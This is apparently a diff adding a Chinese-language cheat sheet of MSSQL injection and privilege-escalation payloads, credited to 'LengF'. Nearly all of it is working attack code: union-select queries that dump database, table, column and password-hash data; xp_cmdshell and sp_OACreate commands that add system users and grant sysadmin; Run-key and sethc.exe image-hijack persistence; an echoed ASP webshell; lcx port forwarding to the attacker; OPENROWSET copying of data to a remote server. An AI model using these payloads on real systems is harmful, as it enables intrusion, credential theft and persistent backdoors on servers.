@@ -1,0 +1,203 @@
+可能作者是采用.net开发的在xp下运行直接报错，没提示什么错误。
+
+下面我是在Win7下开启的这个工具，复制里面的内容粘贴上来。
+
+1.爆所有库名
+
++union+select+name,filename,3,4,5+from+master.dbo.sysdatabases 
+
+//name数据库名  filename 数据库物理路径 
+
++union+select+name,filename,3,4,5+from+master.dbo.sysdatabases+where+and+dbid=x+filename>0
+
+//爆破数据库路径 换dbid值就可以
+
++union+select+1,(select+name+from+master.dbo.sysdatabases+for+xml+path),3,4,5-- 
+
+
+and 0<>db_name(n)--
+
+n改成0,1,2,3……就可以跨库
+2.爆所有表名
+
++union+select+table_name,2,3,4,5+TABLE_CAtalog,table_schema+from+information_schema.tables--
+
+//table_catalo 保存当前数据库名称，table_name  保存当前数据库中所有表
+
++select+name,id,crdate,4,5+from+数据库名.dbo.sysobjects+where+xtype='u.+and+status>=0--
+// name表名 id表的id xtype='u' u代表用户自定义的表 crdate为数据库的创建时间 ststus>=0
+
++union+select+name,object_id,3,4,5+from sys.tables--
+
+3.爆所有字段名 
+
++union+select+name,id,3,4,5+from+数据库名称.dbo.syscolumns+where+xtype=167+and+id=5575058--  
+
+// id是在爆破表名时候的id值 syscolumns中的id和 sysobjects中的id主外键关系
+
++union+select+name+from+syscolumns+where+charindex('pass',name)>0 
+
+//查询含有 “pass”的字段 
+
++union+SELECT name,2,3,4,5 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'yixiang_bizre') 
+
+//查询 yixiang_bizre 表中的所有字段
+
++union+select+table_name,column_name,3,4,5+from+information_schema.COLUMNS--
+
+  //table_name表名称 column_name字段名
+4.添加用户
+
+
+declare @o int;
+exec master..sp_oacreate 'Shell.Application',@o out;
+exec master..sp_oamethod @o,'ShellExecute',NULL,'cmd.exe','/c net user fuck fuck /add
+
+
+5.判断是不是SQL库
+
+and exists（select * from sysobjects）
+
+6.所有账户名
+
++union+select+(select%20%20%20name%2b'||'+password_hash%20from+sys.sql_logins%20for%20xml%20path),2,3,4,5+from+sys.sql_logins //
+
+7.加SQL账户
+--创建个登陆mssql的帐号
+
+;exec master.dbo.sp_addlogin name,pass;-- 
+
+--把创建的mssql登陆帐号提升到sysadmin
+
+;exec master.dbo.sp_addsrvrolemember name,sysadmin;--
+
+8.启动组写入命令行和执行 
+
+EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','help1','REG_SZ','cmd.exe /c net user test ptlove /add'-
+
+9.LCX语句
+
+;exec master..xp_cmdshell 'D:\m目录\lcx.exe -slave 本机ip 51 目标内网ip 3389'--
+
+//目标机器执行
+
+lcx.exe -listen 51 2007 
+
+//本机执行 连接本机的的2007端口就可以了
+10.win200爆目录 
+
+xp_regread读取HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots-- 
+//获取WEB路径
+
+11.恢复xp_cmdshell 
+
+;EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','e:\inetpub\wwwroot\xplog70.dll'
+  //把xplog70.dll文件给他上传到e:\inetpub\wwwroot目录下了
+12.open数据
+
+insert into OPENROWSET('SQLOLEDB', 'server=ip; uid=user;pwd=123456!', 'select c from cmd') select username from test 
+
+   //把 test是本地表，中username的值 插入到 远程cmd表中的c字段里 
+13.判断权限
+
+
++and+1=(select+IS_SRVROLEMEMBER('sysadmin'))-- 
+//sa权限
+and (select IS_MEMBER('db_owner'))=1--   //  dbo
+and (select IS_MEMBER('public'))=1--  //public 
+
+
+14.DIR目录
+遍历系统的目录结构，分析结果并发现WEB虚拟目录，
+
+先创建一个临时表：temp 
+aspx?id=1;create table temp(id nvarchar(255),num1 nvarchar(255),num2 nvarchar(255),num3 nvarchar(255));--
+
+接下来：我们可以利用xp_availablemedia来获得
+当前所有驱动器,并存入temp表中：
+aspx?id=1;insert temp exec master.dbo.xp_availablemedia;--
+
+ 我们可以通过查询temp的内容来获得驱动器列表及相关信息或者利用xp_subdirs获得子目录列表,并存入temp表中：
+
+aspx?id=1;insert into temp(id) exec master.dbo.xp_subdirs 'c:\';--
+
+我们还可以利用xp_dirtree获得所有子目录的目录树结构,并寸入temp表中：
+
+aspx?id=1;insert into temp(id,num1) exec master.dbo.xp_dirtree 'c:\';-- 这样就可以成功的浏览到所有的目录（文件夹）列表?    如果我们需要查看某个文件的内容，可以通过执行xp_cmdsell：
+
+;insert into temp(id) exec master.dbo.xp_cmdshell 'type c:\web\index.asp';--
+
+使用'bulk insert'语法可以将一个文本文件插入到一个临时表中。如：bulk insert temp(id) from 'c:\inetpub\wwwroot\index.asp'    浏览temp就可以看到index.asp文件的内容了！通过分析各种ASP文件，可以得到大量系统信息，WEB建设与管理信息，甚至可以得到SA帐号的连接密码。
+
+
+15.判断站库分离
+
++and+host_name()==@@servername--  //判断站库是否分离
+
+16.存储总结
+xp_availablemedia 显示系统上可用的盘符'C:' xp_availablemedia 
+xp_enumgroups 列出当前系统的使用群组及其说明 xp_enumgroups  
+xp_enumdsn 列出系统上已经设置好的ODBC数据源名称 xp_enumdsn  
+xp_dirtree 显示某个目录下的子目录与文件架构 xp_dirtree 'C:\inetpub\wwwroot\' 
+xp_getfiledetails 获取某文件的相关属性 xp_getfiledetails 'C:\inetpub\wwwroot.asp' 
+dbp.xp_makecab 将目标计算机多个档案压缩到某个档案里所压缩的档案都可以接在参数的后面用豆号隔开
+dbp.xp_makecab'C:\lin.cab','evil',1,'C:\inetpub\mdb.asp'
+  xp_unpackcab 解压缩 xp_unpackcab 'C:\hackway.cab','C:\temp',1 
+xp_ntsec_enumdomains 列出服务器域名 xp_ntsec_enumdomains  
+xp_servicecontrol 停止或者启动某个服务 xp_servicecontrol 'stop','schedule'  
+xp_terminate_process 用pid来停止某个执行中的程序 xp_terminate_process 123  
+dbo.xp_subdirs 只列某个目录下的子目录 dbo.xp_subdirs 'C:'
+17.判断xp_cmdshell
+
++and+1=(select+count(*)+FROM+master.dbo.sysobjects+where+xtype+= 'X'+AND+name+= 'xp_cmdshell')
+
+18.判断系统为win2003
+
+And+charindex('5.3',@@verisdn)
+
+19.echo 写shell
+
+;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("^)^</script^> >c:\\mu.asp'-
+
+20.停掉服务 
+
+exec master..xp_servicecontrol 'stop','schedule'
+exec master..xp_servicecontrol 'start','schedule'
+
+有多少删减。另外添加几句个人经常用到的SQL注入和提权的语句
+当xp_cmshell被删除或者无法使用的情况，我们不妨试试利用SP_OACreate和SP_OAMETHOD调用系统wscript.shell执行系统命令。
+
+Declare @runshell INT
+Exec SP_OACreate 'wscript.shell',@runshell out
+Exec SP_OAMeTHOD @runshell,'run',null,'net user lengf lengf /add'
+
+当这些都失败了，试试关闭系统沙盒模式，它在注册表的位置是
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\Engine\SandBoxMode
+
+默认键值为2，即只在Access的模式下开启沙盒模式，对应的键值是
+0 -- 在任何所有者中禁止启用安全模式
+1 --为仅在允许范围内
+2 --必须在access模式下
+3 --完全开启
+我们要将其设置为0就可以关闭了，通过SQL语句实现
+
+Exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE,'\Software\Microsoft\Jet\4.0\Engine\','SandBoxMode','REG_DWORD',0
+
+执行关闭成功后就可以执行系统命令
+
+select * from OpenRowSet('Microsoft.Jet.OLEDB.4.0',';DataBase=c:\windows\system32\ias\ias.mdb','select shell("net user lengf lengf /add")')
+
+经验告诉我，将你要执行的command转换成十六进制成功率会比较高，但是这个比较被动。
+另外就是可以通过注册表添加run启动项添加用户命令，这种也是被动，要等服务器重启。
+看了这个工具，觉得还缺少一个很使用的方法，那就是映像劫持，位于注册表位置：
+
+HKEY_LOACAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+
+在这个键下面有一个Debugger的参数，如果不为空，就会处理。添加映像劫持方法的SQL语句如下：
+
+exec Master.dbo.xp_regWrite 'HKEY_LOACAL_MACHINE','Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe','debugger','REG_SZ','c:\windows\system32\cmd.exe'
+
+大部分的方法基本就在这里了。另外有一个比较不常用就是利用sqlserveragent服务，默认是关闭的，虽然可以通过xp_servicecontrol来启动但是成功率也不高，遇到也少。感兴趣可以自己查看下资料。
+本文整理：冷锋（LengF） 再次感谢作者的无私分享。
+
